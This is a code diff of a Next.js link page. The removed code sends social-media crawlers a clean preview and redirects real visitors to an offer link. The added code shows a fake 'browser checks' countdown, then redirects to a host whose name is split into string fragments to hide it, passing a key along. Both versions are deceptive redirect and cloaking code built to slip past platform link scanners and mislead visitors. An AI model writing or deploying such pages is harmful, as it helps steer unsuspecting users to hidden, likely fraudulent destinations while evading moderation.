@@ -1,110 +1,80 @@
 import { GetServerSideProps } from "next";
-import fs from "fs";
-import path from "path";
-import Head from "next/head";
 
 type DataItem = {
   id: string;
   title: string;
-  url_img: string;
-  linkoffer: string;
+  image: string;
+  key: string;
 };
 
-type Props = {
-  item?: DataItem;
-  shouldRedirect: boolean;
-};
-
-export const getServerSideProps: GetServerSideProps<Props> = async (context) => {
+export const getServerSideProps: GetServerSideProps = async (context) => {
   const { id } = context.params!;
-  const userAgent = context.req.headers["user-agent"] || "";
+  const res = await fetch(`${process.env.NEXT_PUBLIC_SITE_URL || "https://contoh.vercel.app"}/data.json`);
+  const data: DataItem[] = await res.json();
 
-  const filePath = path.join(process.cwd(), "public", "data.json");
-  const fileData = fs.readFileSync(filePath, "utf-8");
-  const jsonData: DataItem[] = JSON.parse(fileData);
-
-  const item = jsonData.find((x) => x.id === id);
-
+  const item = data.find((x) => x.id === id);
   if (!item) {
     return { notFound: true };
   }
 
-  // Deteksi apakah user datang dari bot sosial media
-  const botPattern = /(facebookexternalhit|twitterbot|whatsapp|telegrambot|linkedinbot)/i;
-  const shouldRedirect = !botPattern.test(userAgent);
-
-  return {
-    props: {
-      item,
-      shouldRedirect,
-    },
-  };
+  return { props: { item } };
 };
 
-export default function RedirectPage({ item, shouldRedirect }: Props) {
-  if (!item) return null;
-
+export default function RedirectPage({ item }: { item: DataItem }) {
   return (
     <>
-      <Head>
-        {/* OG Meta tags */}
+      <head>
         <title>{item.title}</title>
-        <meta property="og:title" content={item.title} />
-        <meta property="og:image" content={item.url_img} />
-        <meta property="og:url" content={`https://contoh.vercel.app/${item.id}`} />
+        <meta name="description" content="" />
+        <meta property="og:locale" content="en_GB" />
         <meta property="og:type" content="website" />
-        <meta name="twitter:card" content="summary_large_image" />
-        <meta name="twitter:title" content={item.title} />
-        <meta name="twitter:image" content={item.url_img} />
-      </Head>
+        <meta property="og:url" content={`https://contoh.vercel.app/${item.id}`} />
+        <meta property="og:title" content={item.title} />
+        <meta property="og:image" content={item.image} />
+        <link
+          href="https://fonts.googleapis.com/css2?family=LXGW+Marker+Gothic&family=Poppins:wght@400;600&display=swap"
+          rel="stylesheet"
+        />
+      </head>
 
-      {shouldRedirect ? (
-        <>
-          <meta httpEquiv="refresh" content={`1;url=${item.linkoffer}`} />
-          <main
-            style={{
-              textAlign: "center",
-              padding: "60px",
-              fontFamily: "sans-serif",
-            }}
-          >
-            <img
-              src={item.url_img}
-              alt={item.title}
-              style={{
-                maxWidth: "400px",
-                width: "100%",
-                borderRadius: "8px",
-                marginBottom: "20px",
-              }}
-            />
-            <h2>{item.title}</h2>
-            <p>Anda akan diarahkan ke halaman tujuan...</p>
-          </main>
-        </>
-      ) : (
-        // Saat bot sosial media membuka (Facebook, Telegram, dll)
-        <main
-          style={{
-            textAlign: "center",
-            padding: "60px",
-            fontFamily: "sans-serif",
+      <body
+        style={{
+          textAlign: "center",
+          display: "flex",
+          flexDirection: "column",
+          justifyContent: "center",
+          minHeight: "100vh",
+          fontFamily: '"LXGW Marker Gothic", sans-serif',
+        }}
+      >
+        <div className="content">
+          <h1>Please wait one moment!</h1>
+          <h2 id="number">3</h2>
+          <p>We need to carry out some browser checks, please wait 3 seconds..</p>
+          <p>Thank you for your patience!</p>
+        </div>
+        <footer>
+          <input type="hidden" id="loc" value={item.key} />
+        </footer>
+
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+            setInterval(function(){
+              var num = document.getElementById("number").innerHTML;
+              if (num > 0) num--;
+              document.getElementById("number").innerHTML = num;
+              if (num == 0) {
+                var url1 = 'signingunwilling';
+                var url2 = '.com';
+                var url3 = '/haba8g98r5';
+                window.location.replace('https://' + url1 + url2 + url3 + "?key=${item.key}");
+              }
+            }, 1000);
+          `,
           }}
-        >
-          <img
-            src={item.url_img}
-            alt={item.title}
-            style={{
-              maxWidth: "400px",
-              width: "100%",
-              borderRadius: "8px",
-              marginBottom: "20px",
-            }}
-          />
-          <h2>{item.title}</h2>
-          <p>Preview link untuk sosial media.</p>
-        </main>
-      )}
+        />
+      </body>
     </>
   );
 }
